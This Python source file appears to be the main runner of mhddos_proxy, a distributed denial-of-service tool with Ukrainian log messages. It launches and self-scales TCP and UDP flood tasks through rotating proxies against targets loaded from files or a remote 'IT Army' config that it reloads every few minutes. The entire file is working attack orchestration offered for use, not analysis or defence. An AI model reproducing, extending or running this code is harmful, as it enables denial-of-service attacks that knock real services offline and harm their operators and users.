# @formatter:off
import colorama; colorama.init()
# @formatter:on
import asyncio
from functools import partial
import sys
import time
from threading import Event, Thread
from typing import List, Set, Union

from src.cli import init_argparse
from src.core import (
    logger, cl,
    IT_ARMY_CONFIG_URL, REFRESH_OVERTIME, REFRESH_RATE, ONLY_MY_IP,
    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS, SCHEDULER_MIN_INIT_FRACTION
)
from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood, AttackSettings
from src.output import print_progress, show_statistic, print_banner
from src.proxies import ProxySet
from src.system import fix_ulimits, is_latest_version, setup_event_loop, WINDOWS_WAKEUP_SECONDS
from src.targets import Target, TargetsLoader


class GeminoCurseTaskSet:

    def __init__(
        self,
        loop: asyncio.AbstractEventLoop,
        runnables: List[AsyncTcpFlood],
        initial_capacity: int = 2,
        max_capacity: int = 10_000,
        fork_scale: int = 2,
        failure_delay: float = 0.25
    ):
        self._loop = loop
        self._tasks = runnables
        self._initial_capacity = initial_capacity
        self._max_capacity = max_capacity
        self._fork_scale = fork_scale
        self._pending: Set[asyncio.Task] = set()
        self._failure_delay: float = failure_delay
        self._shutdown_event: asyncio.Event = asyncio.Event()

    def _on_connect(self, runnable, f):
        try:
            if f.result() and len(self) <= self._max_capacity - self._fork_scale:
                for _ in range(self._fork_scale):
                    self._launch(runnable)
        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    def _on_finish(self, runnable, f):
        self._pending.remove(f)
        try:
            f.result()
        except asyncio.CancelledError as e:
            return
        except asyncio.TimeoutError:
            pass
        except Exception:
            pass
        finally:
            self._launch(runnable)

    def __len__(self) -> int:
        return len(self._pending)

    def _launch(self, runnable) -> None:
        if self._shutdown_event.is_set(): return
        on_connect = self._loop.create_future()
        on_connect.add_done_callback(partial(self._on_connect, runnable))
        task = self._loop.create_task(runnable.run(on_connect))
        task.add_done_callback(partial(self._on_finish, runnable))
        self._pending.add(task)

    async def loop(self) -> None:
        # the algo:
        # 1) for each runnable launch {initial_capacity} tasks
        # 2) as soon as connection ready on any of them, fork runner
        #    if max_capacity is enough
        # 3) on finish, restart corresponding runner
        #
        # potential improvement: find a way to downscale
        assert not self._shutdown_event.is_set(), "Can only be used once"
        try:
            for runnable in self._tasks:
                for _ in range(self._initial_capacity):
                    self._launch(runnable)
            while not self._shutdown_event.is_set():
                await asyncio.sleep(WINDOWS_WAKEUP_SECONDS)
        except asyncio.CancelledError as e:
            self._shutdown_event.set()
            for task in self._pending:
                task.cancel()
            raise e


async def run_udp_flood(runnable: AsyncUdpFlood) -> None:
    num_failures = 0
    while True:
        try:
            await runnable.run()
        except asyncio.CancelledError:
            raise
        except Exception:
            num_failures += 1
            if num_failures >= FAILURE_BUDGET_FACTOR:
                await asyncio.sleep(FAILURE_DELAY_SECONDS)
                num_failures = 0


async def run_ddos(
    proxies: ProxySet,
    targets_loader: TargetsLoader,
    attack_settings: AttackSettings,
    reload_after: int,
    http_methods: List[str],
    debug: bool,
    table: bool,
    total_threads: int,
    use_my_ip: int,
    initial_capacity: int,
    fork_scale: int,
    failure_delay: float,
):
    loop = asyncio.get_event_loop()
    stats = []
    print_stats = debug or table

    # initial set of proxies
    if proxies.has_proxies:
        num_proxies = await proxies.reload()
        if num_proxies == 0:
            logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
            exit()

    def prepare_flooder(target: Target, method: str) -> Union[AsyncUdpFlood, AsyncTcpFlood]:
        target_stats = target.create_stats(method)
        stats.append(target_stats)
        if target.has_options:
            target_rpc = int(target.option(Target.OPTION_RPC, "0"))
            settings = attack_settings.with_options(
                requests_per_connection=target_rpc if target_rpc > 0 else None,
                high_watermark=target.option(Target.OPTION_HIGH_WATERMARK),
            )
        else:
            settings = attack_settings

        kwargs = {
            'url': target.url,
            'ip': target.addr,
            'method': method,
            'event': None,
            'stats': target_stats,
            'proxies': proxies,
            'loop': loop,
            'settings': settings,
        }
        if not print_stats:
            logger.info(
                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (target.url.host, target.url.port, method)
            )
        return mhddos_main(**kwargs)

    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    if not print_stats:
        # Keep the docs/info on-screen for some time before outputting the logger.info above
        await asyncio.sleep(5)

    active_flooder_tasks = []
    tcp_task_group = None

    async def install_targets(targets):
        nonlocal tcp_task_group

        # cancel running flooders
        if active_flooder_tasks:
            for task in active_flooder_tasks:
                task.cancel()
            active_flooder_tasks.clear()

        stats.clear()

        tcp_flooders, udp_flooders = [], []
        for target in targets:
            assert target.is_resolved, "Unresolved target cannot be used for attack"
            # udp://, method defaults to "UDP"
            if target.is_udp:
                udp_flooders.append(prepare_flooder(target, target.method or 'UDP'))
            # Method is given explicitly
            elif target.method is not None:
                tcp_flooders.append(prepare_flooder(target, target.method))
            # tcp://
            elif target.url.scheme == "tcp":
                tcp_flooders.append(prepare_flooder(target, 'TCP'))
            # HTTP(S), methods from --http-methods
            elif target.url.scheme in {"http", "https"}:
                for method in http_methods:
                    tcp_flooders.append(prepare_flooder(target, method))
            else:
                logger.error(f"Unsupported scheme given: {target.url.scheme}")

        if tcp_flooders:
            num_flooders = len(tcp_flooders)

            if initial_capacity * num_flooders > total_threads:
                logger.warning(
                    f"{cl.MAGENTA}Початкова кількість одночасних атак перевищує "
                    f"максимально дозволену параметром `-t` ({total_threads}).{cl.RESET}"
                )

            # adjust settings to avoid situation when we have just a few
            # targets in the config (in this case with default CLI settings you are
            # going to start scaling from 3-15 tasks to 7_500)
            adjusted_capacity = max(
                initial_capacity,
                int(SCHEDULER_MIN_INIT_FRACTION * total_threads / num_flooders)
            )

            tcp_task_group = GeminoCurseTaskSet(
                loop,
                runnables=tcp_flooders,
                initial_capacity=adjusted_capacity,
                max_capacity=total_threads,
                fork_scale=fork_scale,
                failure_delay=failure_delay,
            )
            task = loop.create_task(tcp_task_group.loop())
            active_flooder_tasks.append(task)
        else:
            tcp_task_group = None

        for flooder in udp_flooders:
            task = loop.create_task(run_udp_flood(flooder))
            active_flooder_tasks.append(task)

    try:
        initial_targets, _ = await targets_loader.load(resolve=True)
    except Exception as exc:
        logger.error(f"{cl.RED}Завантаження цілей завершилося помилкою: {exc}{cl.RESET}")
        initial_targets = []

    if not initial_targets:
        logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
        exit()
    await install_targets(initial_targets)

    tasks = []

    async def stats_printer():
        cycle_start = time.perf_counter()
        while True:
            await asyncio.sleep(REFRESH_RATE)
            try:
                passed = time.perf_counter() - cycle_start
                num_proxies = len(proxies)
                show_statistic(
                    stats,
                    table,
                    use_my_ip,
                    num_proxies,
                    passed > REFRESH_RATE * REFRESH_OVERTIME,
                )
                if tcp_task_group is not None:
                    logger.debug(f"Task group size: {len(tcp_task_group)}")
            finally:
                cycle_start = time.perf_counter()

    # setup coroutine to print stats
    if print_stats:
        tasks.append(loop.create_task(stats_printer()))
    else:
        print_progress(len(proxies), use_my_ip, False)

    async def reload_targets(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                targets, changed = await targets_loader.load(resolve=True)
                if changed and not targets:
                    logger.warning(
                        f"{cl.MAGENTA}Завантажено порожній конфіг - буде використано попередній{cl.RESET}"
                    )
                else:
                    await install_targets(targets)
            except asyncio.CancelledError as e:
                raise e
            except Exception as exc:
                logger.warning(f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")

    # setup coroutine to reload targets
    tasks.append(loop.create_task(reload_targets(delay_seconds=reload_after)))

    async def reload_proxies(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                if (await proxies.reload()) == 0:
                    logger.warning(
                        f"{cl.MAGENTA}Не вдалося перезавантажити список проксі - буде використано попередній{cl.RESET}"
                    )

            except asyncio.CancelledError:
                raise
            except Exception:
                pass

    # setup coroutine to reload proxies
    if proxies.has_proxies:
        tasks.append(loop.create_task(reload_proxies(delay_seconds=reload_after)))

    await asyncio.gather(*tasks, return_exceptions=True)


async def start(args, shutdown_event: Event):
    use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
    print_banner(use_my_ip)
    fix_ulimits()

    if args.table:
        args.debug = False

    is_old_version = not await is_latest_version()
    if is_old_version:
        logger.warning(
            f"{cl.RED}Доступна нова версія - рекомендовано оновитися{cl.RESET}: "
            "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
        )

    if args.itarmy:
        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
    else:
        targets_loader = TargetsLoader(args.targets, args.config)

    # we are going to fetch proxies even in case we have only UDP
    # targets because the list of targets might change at any point in time
    proxies = ProxySet(args.proxies, use_my_ip)

    attack_settings = AttackSettings(
        requests_per_connection=args.rpc,
        dest_connect_timeout_seconds=10.0,
        drain_timeout_seconds=10.0,
        high_watermark=1024 << 2,  # roughly 4 packets (normally 1024 bytes on a single write)
        # note that "generic flood" attacks switch reading off completely
        reader_limit=1024 << 3,
        socket_rcvbuf=1024 << 3,
    )

    # XXX: with the current implementation there's no need to
    # have 2 separate functions to setups params for launching flooders
    reload_after = 300
    await run_ddos(
        proxies,
        targets_loader,
        attack_settings,
        reload_after,
        args.http_methods,
        args.debug,
        args.table,
        args.threads,
        use_my_ip,
        args.scheduler_initial_capacity,
        args.scheduler_fork_scale,
        args.scheduler_failure_delay,
    )
    shutdown_event.set()


def _main(args, shutdown_event, uvloop):
    loop = setup_event_loop(uvloop)
    loop.run_until_complete(start(args, shutdown_event))


def main():
    args = init_argparse().parse_args()

    uvloop = False
    try:
        __import__("uvloop").install()
        uvloop = True
        logger.info(
            f"{cl.GREEN}'uvloop' успішно активований "
            f"(підвищенна ефективність роботи з мережею){cl.RESET}"
        )
    except:
        pass

    shutdown_event = Event()
    try:
        # run event loop in a separate thread to ensure the application
        # exists immediately after Ctrl+C
        Thread(target=_main, args=[args, shutdown_event, uvloop], daemon=True).start()
        # we can do something smarter rather than waiting forever,
        # but as of now it's gonna be consistent with previous version
        while True:
            shutdown_event.wait(WINDOWS_WAKEUP_SECONDS)
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
        sys.exit()


if __name__ == '__main__':
    main()
